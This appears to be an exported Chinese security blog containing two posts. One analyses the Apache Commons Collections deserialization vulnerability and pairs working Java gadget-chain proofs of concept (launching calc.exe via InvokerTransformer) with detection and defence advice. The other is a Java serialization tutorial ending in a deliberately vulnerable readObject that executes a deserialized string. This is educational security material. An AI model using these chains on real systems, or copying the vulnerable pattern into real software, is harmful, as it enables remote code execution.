&#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); &#125; else &#123; // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125; &#125; &#125; 查看自定义的readObejct()方法，其中在满足System.getSecurityManager() == null时会调用 valObj.toString()，从攻击思路上看，其他的条件都是无法满足的。因此valObj.toString()就成为了突破口，此时要找到一个合适的工具在toString()方法被调用的时候会触发我们构造的恶意代码。 利用类2——AnnotationInvocationHandler前提是换个低的JDK版本，本地测试时换的JDK1.7。 先看下AnnotationInvocationHandler的类定义，定义了Class类型的type变量、Map类型的memberValues变量以及Method[]类型的memberMethods数组变量，并且重写了readObject()方法： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class type; private final Map&lt;String, Object&gt; memberValues; private transient volatile Method[] memberMethods = null; AnnotationInvocationHandler(Class var1, Map&lt;String, Object&gt; var2) &#123; this.type = var1; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; String var4 = var2.getName(); Class[] var5 = var2.getParameterTypes(); if (var4.equals(\"equals\") &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123; return this.equalsImpl(var3[0]); &#125; else &#123; assert var5.length == 0; if (var4.equals(\"toString\")) &#123; return this.toStringImpl(); &#125; else if (var4.equals(\"hashCode\")) &#123; return this.hashCodeImpl(); &#125; else if (var4.equals(\"annotationType\")) &#123; return this.type; &#125; else &#123; Object var6 = this.memberValues.get(var4); if (var6 == null) &#123; throw new IncompleteAnnotationException(this.type, var4); &#125; else if (var6 instanceof ExceptionProxy) &#123; throw ((ExceptionProxy)var6).generateException(); &#125; else &#123; if (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != 0) &#123; var6 = this.cloneArray(var6); &#125; return var6; &#125; &#125; &#125; &#125; ... private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; return; &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125; &#125;&#125; 可以看到，在readObject()函数中，在其遍历memberValues.entrySet()时，会用键名在memberTypes中尝试获取一个Class（这里为var7变量），并判断它是否为null，这是触发反序列化RCE所需要满足的条件。 接下来是网上很少提到过的一个结论：首先，memberTypes是AnnotationType的一个字段，里面存储着Annotation接口声明的方法信息 （键名为方法名，值为方法返回类型） 。因此，我们在获取AnnotationInvocationHandler实例时，需要传入一个方法个数大于0的Annotation子类 （一般来说，若方法个数大于0，都会包含一个名为value的方法） ，并且原始Map中必须存在任意以这些方法名为键名的元素，且元素值不是该方法返回类型的实例，才能顺利进入setValue()的流程。 因此我们只需要： 寻找一个Map类，该类的特点是其中的Entry在SetValue的时候会执行额外的程序； 将这个Map类作为参数构建一个AnnotationInvocationHandler对象，并序列化； 3、查找可通过toString()触发transform()方法的合适的类利用类1——BadAttributeValueExpException从BadAttributeValueExpException类的readObejct()方法知道，关注点在valObj.toString()中，那么现在就需要找到一个合适的类在调用toString()方法时触发transform()方法来执行我们构造的反射链。 LazyMap——调用get()方法触发transform()方法 LazyMap是Commons-collections 3.1提供的一个工具类，是Map的一个实现，主要的内容是利用工厂设计模式，在用户get一个不存在的key的时候执行一个方法来生成Key值，当且仅当get行为存在的时候Value才会被生成。其定义代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; private static final long serialVersionUID = 7990956402564206740L; protected final Transformer factory; public static Map decorate(Map map, Factory factory) &#123; return new LazyMap(map, factory); &#125; public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(\"Factory must not be null\"); &#125; else &#123; this.factory = FactoryTransformer.getInstance(factory); &#125; &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(\"Factory must not be null\"); &#125; else &#123; this.factory = factory; &#125; &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; out.defaultWriteObject(); out.writeObject(this.map); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); this.map = (Map)in.readObject(); &#125; public Object get(Object key) &#123; if (!this.map.containsKey(key)) &#123; Object value = this.factory.transform(key); this.map.put(key, value); return value; &#125; else &#123; return this.map.get(key); &#125; &#125;&#125; LazyMap测试代码，在get一个不存在的key的时候执行一个方法来生成Key值，下面的代码运行结果会调用transform()输出”Mi1k7ea”： 12345678910public class Test&#123; public static void main(String[] args) throws Exception &#123; Map targetMap = LazyMap.decorate(new HashMap(), new Transformer() &#123; public Object transform(Object input) &#123; return \"Mi1k7ea\"; &#125; &#125;); System.out.println(targetMap.get(\"hhhhhhhh\")); &#125;&#125; TiedMapEntry——调用toString()方法触发getValue()方法（即LazyMap.get()） TiedMapEntry也存在于Commons-collections 3.1，该类主要的作用是将一个Map绑定到Map.Entry下，形成一个映射。 主要代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public Object getKey() &#123; return this.key; &#125; public Object getValue() &#123; return this.map.get(this.key); &#125; public Object setValue(Object value) &#123; if (value == this) &#123; throw new IllegalArgumentException(\"Cannot set value to this map entry\"); &#125; else &#123; return this.map.put(this.key, value); &#125; &#125; public boolean equals(Object obj) &#123; if (obj == this) &#123; return true; &#125; else if (!(obj instanceof Entry)) &#123; return false; &#125; else &#123; boolean var10000; label43: &#123; label29: &#123; Entry other = (Entry)obj; Object value = this.getValue(); if (this.key == null) &#123; if (other.getKey() != null) &#123; break label29; &#125; &#125; else if (!this.key.equals(other.getKey())) &#123; break label29; &#125; if (value == null) &#123; if (other.getValue() == null) &#123; break label43; &#125; &#125; else if (value.equals(other.getValue())) &#123; break label43; &#125; &#125; var10000 = false; return var10000; &#125; var10000 = true; return var10000; &#125; &#125; public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public String toString() &#123; return this.getKey() + \"=\" + this.getValue(); &#125;&#125; 分析下这个类，首先是toString()中调用了getValue()，而getValue()中实际是map.get(key)，如此一来就构建起了整个调用链接了。 利用类2——AnnotationInvocationHandler从AnnotationInvocationHandler类的readObejct()方法知道，关注点在memberValue.setValue()中，那么现在就需要找到一个合适的类在调用setValue()方法时触发transform()方法来执行我们构造的反射链。 TransformedMap TransformedMap是Commons-collections 3.1提供的一个工具类，用来包装一个Map对象，并且在该对象的Entry的Key或者Value进行改变的时候，对该Key和Value进行Transformer提供的转换操作，从而满足了我们对理想型媒介的需求，即能在调用setValue()方法时触发transform()方法来执行我们构造的反射链： 12345678910111213141516171819202122232425262728public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable &#123; private static final long serialVersionUID = 7023152376788900464L; protected final Transformer keyTransformer; protected final Transformer valueTransformer; public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer); &#125; ... protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; &#125; protected Object transformKey(Object object) &#123; return this.keyTransformer == null ? object : this.keyTransformer.transform(object); &#125; protected Object transformValue(Object object) &#123; return this.valueTransformer == null ? object : this.valueTransformer.transform(object); &#125; protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value); &#125; ...&#125; 构造过程小结利用类1——BadAttributeValueExpException这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了： 最终构造的代码 1234567891011121314151617181920212223242526272829303132333435363738public class test &#123; public static void main(String args[]) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); final Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); //利用反射的方式来向对象传参 Field valfield = val.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(val, entry); test t = new test(); t.deserialize(t.serialize(val)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; 运行结果，弹出计算器： 利用类2——AnnotationInvocationHandler这里将上述分析的调用过程做个图清晰地列出来，相信应该很明确该反射链执行的过程了： 最终构造的代码 123456789101112131415161718192021222324252627282930313233343536373839public class POC_Test&#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc.exe\",&#125;), &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innermap = new HashMap(); innermap.put(\"value\", \"value\"); Map outmap = TransformedMap.decorate(innermap, null, transformerChain); //通过反射获得AnnotationInvocationHandler类对象 Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); //通过反射获得cls的构造函数 Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); //这里需要设置Accessible为true，否则序列化失败 ctor.setAccessible(true); //通过newInstance()方法实例化对象 Object instance = ctor.newInstance(Retention.class, outmap); POC_Test poc_test = new POC_Test(); poc_test.deserialize(poc_test.serialize(instance)); &#125; public byte[] serialize(final Object obj) throws IOException &#123; ByteArrayOutputStream out = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); return out.toByteArray(); &#125; public Object deserialize(final byte[] serialized) throws Exception &#123; ByteArrayInputStream in = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(in); return objIn.readObject(); &#125;&#125; 运行结果，弹出计算器： 0x04 检测方法全局搜索ObjectInputStream类，检查是否调用readObject()方法，若存在该方法则检查其是否进行了重写，若重写了readObject()方法则需严格排查是否可构造反射链来执行任意命令。 当然，结合其他几个类型的Java反序列漏洞，全局搜索的类方法如下： 1234567ObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject 0x05 防御方法1、重写ObjectInputStream的resolveClass()，设置黑白名单机制最常见的方法，就是在ObjectInputStream中设置黑白名单机制的方式进行防御。下面就在Apache Commons Collections反序列化漏洞示例代码中直接添加防御代码。 写一个SecureObjectInputStream类，继承于ObjectInputStream，重写resolveClass()方法实现黑名单机制过滤： 1234567891011121314151617181920import javax.management.BadAttributeValueExpException;import java.io.*;public class SecureObjectInputStream extends ObjectInputStream &#123; public SecureObjectInputStream(InputStream inputStream) throws IOException &#123; super(inputStream); &#125; /** * Only deserialize instances of our expected Bicycle class */ @Override protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException &#123; if (!desc.getName().equals(BadAttributeValueExpException.class.getName())) &#123; throw new InvalidClassException(\"触发黑名单机制，禁止反序列化恶意类对象\", desc.getName()); &#125; return super.resolveClass(desc); &#125;&#125; 接着只需在调用代码中将ObjectInputStream替换为SecureObjectInputStream来创建ObjectInputStream对象。再次运行时发现，触发黑名单机制，无法进行反序列化漏洞的利用： 2、利用SerialKiller.jar原理和上面是一样的，只是已经是成熟的轮子了可以直接使用。具体的参考https://github.com/ikkisoft/SerialKiller 创建sk.conf配置文件在本地项目根目录中，其中只设置了黑名单过滤BadAttributeValueExpException： 1234567891011121314151617&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!-- serialkiller.conf --&gt;&lt;config&gt; &lt;refresh&gt;6000&lt;/refresh&gt; &lt;mode&gt; &lt;profiling&gt;false&lt;/profiling&gt; &lt;/mode&gt; &lt;logging&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/logging&gt; &lt;blacklist&gt; &lt;regexp&gt;.*BadAttributeValueExpException$&lt;/regexp&gt; &lt;/blacklist&gt; &lt;whitelist&gt; &lt;regexp&gt;.*&lt;/regexp&gt; &lt;/whitelist&gt;&lt;/config&gt; 将SerialKiller.jar添加进Java项目中，并将其替换掉ObjectInputStream来创建ObjectInputStream对象。运行后发现，黑名单过滤了BadAttributeValueExpException类并抛出错误无法往下执行： 3、禁止JVM执行外部命令Runtime.exec通过扩展SecurityManager可以实现，这里添加一个函数，在进行反序列化操作之前调用即可： 123456789101112131415161718192021222324252627282930313233343536public static void noSerial()&#123; SecurityManager originalSecurityManager = System.getSecurityManager(); if (originalSecurityManager == null) &#123; // 创建自己的SecurityManager SecurityManager sm = new SecurityManager() &#123; private void check(Permission perm) &#123; // 禁止exec if (perm instanceof java.io.FilePermission) &#123; String actions = perm.getActions(); if (actions != null &amp;&amp; actions.contains(\"execute\")) &#123; throw new SecurityException(\"execute denied!\"); &#125; &#125; // 禁止设置新的SecurityManager，保护自己 if (perm instanceof java.lang.RuntimePermission) &#123; String name = perm.getName(); if (name != null &amp;&amp; name.contains(\"setSecurityManager\")) &#123; throw new SecurityException(\"System.setSecurityManager denied!\"); &#125; &#125; &#125; @Override public void checkPermission(Permission perm) &#123; check(perm); &#125; @Override public void checkPermission(Permission perm, Object context) &#123; check(perm); &#125; &#125;; System.setSecurityManager(sm); &#125;&#125; 将创建ObjectInputStream对象的语句换回原来的ObjectInputStream类，在反序列化之前调用前面定义的函数noSerial()，运行发现，无报错，也没有弹出计算器，即防御成功： 0x06 参考Java反序列化漏洞的原理分析 Java反序列化漏洞从入门到深入 Java反序列化漏洞分析 浅析Java序列化和反序列化 深入理解 JAVA 反序列化漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java序列化和反序列化机制","date":"2019-02-03T12:12:02.000Z","path":"2019/02/03/Java序列化和反序列化机制/","text":"这里主要讲解Java序列化及反序列化机制。 何为序列化Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。 序列化：把对象转换为字节序列的过程。 反序列化：把字节序列恢复为对象的过程。 为何设计序列化1、可以弥补不同操作系统之间的差异，如Windows上创建的对象进行序列化后通过网络传到Linux上可直接反序列化得到该对象而无需担心数据在不同机器、系统上的表示会不同； 2、对Java的远程方法调用RMI是必需的。RMI是为了使得存在于其他主机上的对象使用起来像本机上的对象一样，当向远程对象发送信息时，需要通过对象序列化来传输参数和返回值； 3、对Java Bean是必需的。使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的； 4、方便保存对象信息以便于下次JVM启动时可以直接使用。 序列化的条件一个类对象要想实现序列化，必须满足两个条件： 1、该类必须实现 java.io.Serializable 对象。 2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 如何序列化要序列化一个对象，首先要创建OutputStream对象，再将其封装在一个ObjectOutputStream对象内，接着只需调用writeObject()即可将对象序列化，并将其发送给OutputStream（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。 要反序列化出一个对象，需要将一个InputStream封装在ObjectInputStream内，然后调用readObject()即可。 ObjectInputStream/ObjectOutputStream类 类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。 ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外即writeObject()，其用来序列化一个对象，并将它发送到输出流： 1public final void writeObject(Object x) throws IOException 同样的，ObjectInputStream类包含反序列化一个对象的方法readObject()，其用于从流中取出下一个对象，并将对象反序列化，它的返回值为Object，因此需要将它转换成合适的数据类型： 1public final Object readObject() throws IOException, ClassNotFoundException Demo 定义一个User类，继承Serializable接口，其中address字段设置transient关键字： 1234567891011import java.io.Serializable;public class User implements Serializable &#123; public String name; public transient String address; public int number; public void info()&#123; System.out.println(\"Name: \" + name + \"\\nAddress: \" + address + \"\\nNumber: \" + number); &#125;&#125; 编写一个进行序列化操作的类： 123456789101112131415161718192021222324252627import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = \"Mi1k7ea\"; user.address = \"England\"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream(\"user.ser\"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println(\"[*]User对象已经序列化保存到user.ser文件中\"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] args) &#123; serialize_test(); &#125;&#125; 运行后查看输出，给该User对象赋值成功并保存到了目标文件中： 用WinHex打开user.ser文件查看： 在刚刚的test.class中添加反序列化操作的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = \"Mi1k7ea\"; user.address = \"England\"; user.number = 666; user.info(); try &#123; FileOutputStream fos = new FileOutputStream(\"user.ser\"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println(\"[*]User对象已经序列化保存到user.ser文件中\"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream(\"user.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println(\"[*]反序列化后的内容：\"); user.info(); &#125; public static void main(String[] args) &#123;// serialize_test(); unserialize_test(); &#125;&#125; 注意，readObject()方法中的try/catch代码块尝试捕获 ClassNotFoundException 异常。对于JVM可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个ClassNotFoundException异常。 查看反序列化结果： 可以看到反序列化出来的对象，除了Address属性外其余的属性值都成功地反序列化出来了得到几乎和序列化之前一样的对象。这里Address属性是因为设置了transient关键字，具体的原理在下面会讲解。 serialVersionUIDserialVersionUID即序列化的版本号，适用于Java的序列化机制。简单来说，Java的序列化机制是通过判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。 具体的序列化过程是这样的：序列化操作的时候系统会把当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会去检测文件中的serialVersionUID，判断它是否与当前类的serialVersionUID一致，如果一致就说明序列化类的版本与当前类版本是一样的，可以反序列化成功，否则失败。 serialVersionUID有两种显示的生成方式： 一是默认的1L，比如：private static final long serialVersionUID = 1L； 二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如： 1private static final long serialVersionUID = xxxxL; 当一个类实现了Serializable接口，如果没有显示的定义serialVersionUID，Eclipse会提供相应的提醒。面对这种情况，我们只需要在Eclipse中点击类中warning图标一下，Eclipse就会自动给定两种生成的方式。如果不想定义，在Eclipse的设置中也可以把它关掉的，设置如下： Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems将Serializable class without serialVersionUID的warning改成ignore即可。 当实现java.io.Serializable接口的类没有显式地定义一个serialVersionUID变量时候，Java序列化机制会根据编译的Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件(类名，方法明等)没有发生变化(增加空格，换行，增加注释等等)，就算再编译多次，serialVersionUID也不会变化的。 显式地定义serialVersionUID有两种用途： 1、 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID； 2、 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID。 序列化的控制在某些情况下，我们可能需要对序列化的过程进行控制，比如说不需要哪些部分被反序列化等，这时可通过Externalizable接口替代Serializable接口来实现对序列化过程的控制。 1、Externalizable Externalizable接口继承了Serializable接口，同时添加了两个方法即writeExternal()和readExternal()，两者会在序列化和反序列化的过程中被自动调用，以便于执行一些特殊操作来实现过程控制。 2、transient关键字 当我们对序列化进行控制时，可能有些特殊子对象不想让Java的序列化机制自动保存和恢复，比如说子对象表示的是敏感信息。即使对象中的这些信息是private属性，但经过序列化处理后人们就可以通过读取文件或拦截数据报文来非法获取该信息。 这时存在两个方法。一是通过将类实现为前面的Externalizable，这时无任何东西可以自动序列化，并且可在writeExternal()内部只对所需部分进行显式的序列化；二是当我们正在操作的是一个Serializable对象，则所有序列化操作会自动执行，这时就可应用到transient（瞬时）关键字来逐个字段地关闭序列化，即说明指定字段内容在序列化中是不需要保存或恢复操作的。 由于Externalizable对象在默认情况下不保存它们的任何字段，所以transient关键字只能和Serializable对象一起使用。 3、自己实现Serializable 若非十分坚定地使用Externalizable接口，那么还可以自己实现Serializable接口，并添加writeObject()和readObject()方法，一旦对象被序列化和反序列化还原，就会自动地分别调用这两个方法。值得注意的是，这里说的是“添加”而非“覆盖”或“实现”，也就是说，只要我们提供了这两个方法，程序就会使用这两个方法而非默认的序列化机制。 这些方法必须具有准确的方法特征签名： 123private void writeObject(ObjectOutputStream stream) throws IOExceptionprivate void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException 注意，这些方法被定义成了private。 在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法的情形类似。 序列化的二进制格式看回刚才用WinHex打开的序列化Demo生成的user.ser文件： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 00 05：STREAM_VERSION，序列化协议版本。 0x73：TC_OBJECT，声明这是一个新的对象。 0x72：TC_CLASSDESC，声明这里开始一个新Class。 00 04：Class名字的长度，这里Class名为User，长度为4。 55 73 65 72：类名称User。 64 D4 C4 D2 26 CA C4 8D：SerialVersionUID，序列化ID，如果没有指定，则会由算法随机生成一个8byte的ID。 0x02：标记号，该值声明该对象支持序列化。 00 02：该类所包含的域个数。 0x49：域类型，49 代表”I”，也就是Int。 00 06：域名字的长度，该域名为number、长度为6。 6E 75 6D 62 65 72：域名字描述，这里为number。 0x4C：域的类型，4C代表String。 00 04：域名字的长度，该域名为name、长度为4。 6E 61 6D 65：域名字描述，这里为name。 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 12：该String长度，这里String为“Ljava/lang/String;”、长度为0x12. 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B：JVM的标准对象签名表示法，这里是指String为“Ljava/lang/String;”。 0x78：TC_ENDBLOCKDATA，对象数据块结束的标志。 0x70：TC_NULL，说明没有其他超类的标志。 00 00 02 9A：这个暂时不知道，各位大佬知道的麻烦指点一下 ：) 0x74：TC_STRING，代表一个new String，用String来引用对象。 00 07：域名字的长度，该域名为Mi1k7ea、长度为7。 4D 69 31 6B 37 65 61：域名字描述，这里为“Mi1k7ea”。 自定义实现序列化如前面序列化的控制中的自己实现Serializable所说，可以添加writeObject()和readObject()这两个方法，它们并不属于任何的类和接口，只要在要序列化的类中提供这两个方法，就会在序列化机制中自动被调用。 自定义实现的好处是：程序员可以更加精细或者说可以去定制自己想要实现的序列化，如下面例子中将name和address变量值反转。利用这种特点，可以在序列化过程中对一些敏感信息做特殊的处理。 User.class：添加了private关键字的writeObject()和readObject()两个方法 123456789101112131415161718192021222324import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println(\"[*]Write Object.\"); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println(\"[*]Read Object.\"); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); &#125;&#125; test.class： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); user.name = \"Mi1k7ea\"; user.address = \"England\"; user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream(\"user.ser\"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println(\"[*]User对象已经序列化保存到user.ser文件中\"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream(\"user.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println(\"Name: \" + user.name + \"\\nAddress: \" + user.address + \"\\nNumber: \" + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); &#125;&#125; 运行查看，确实是经过自己编写的writeObject()和readObject()两个方法来实现序列化和反序列化操作的： what’s more！——反序列化漏洞点 Java反序列化漏洞点通常在于自定义实现的readObject()方法的代码逻辑存在缺陷，导致可能会触发反序列化漏洞。 其实这和PHP反序列化漏洞原理差不多，PHP中是魔法函数若存在缺陷代码则可能会存在反序列化漏洞风险，这类似于Java中自定义实现的readObject()函数。 下面的例子只在前面的例子中添加if语句中的Runtime.getRuntime().exec()： User.class： 12345678910111213141516171819202122232425262728import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class User implements Serializable &#123; public String name; public String address; public int number; private void writeObject(ObjectOutputStream out) throws IOException &#123; System.out.println(\"[*]Write Object.\"); out.writeObject(new StringBuffer(name).reverse()); out.writeObject(new StringBuffer(address).reverse()); out.writeInt(number); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; System.out.println(\"[*]Read Object.\"); this.name = ((StringBuffer)in.readObject()).reverse().toString(); this.address = ((StringBuffer)in.readObject()).reverse().toString(); this.number = in.readInt(); //加了个判断，当数字为666时，进入缺陷代码逻辑块 if (this.number == 666)&#123; Runtime.getRuntime().exec(name); &#125; &#125;&#125; test.class 12345678910111213141516171819202122232425262728293031323334353637383940414243import java.io.*;public class test &#123; public static void serialize_test()&#123; User user = new User(); //将name字段值修改为calc命令 user.name = \"calc.exe\"; user.address = \"England\"; //将number值设置为满足if判断条件的666值 user.number = 666; try &#123; FileOutputStream fos = new FileOutputStream(\"user.ser\"); ObjectOutputStream obs = new ObjectOutputStream(fos); obs.writeObject(user); obs.close(); fos.close(); System.out.println(\"[*]User对象已经序列化保存到user.ser文件中\"); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; public static void unserialize_test()&#123; User user = null; try &#123; FileInputStream fis = new FileInputStream(\"user.ser\"); ObjectInputStream ois = new ObjectInputStream(fis); user = (User)ois.readObject(); ois.close(); fis.close(); &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e)&#123; e.printStackTrace(); &#125; System.out.println(\"Name: \" + user.name + \"\\nAddress: \" + user.address + \"\\nNumber: \" + user.number); &#125; public static void main(String[] args) &#123; serialize_test(); unserialize_test(); 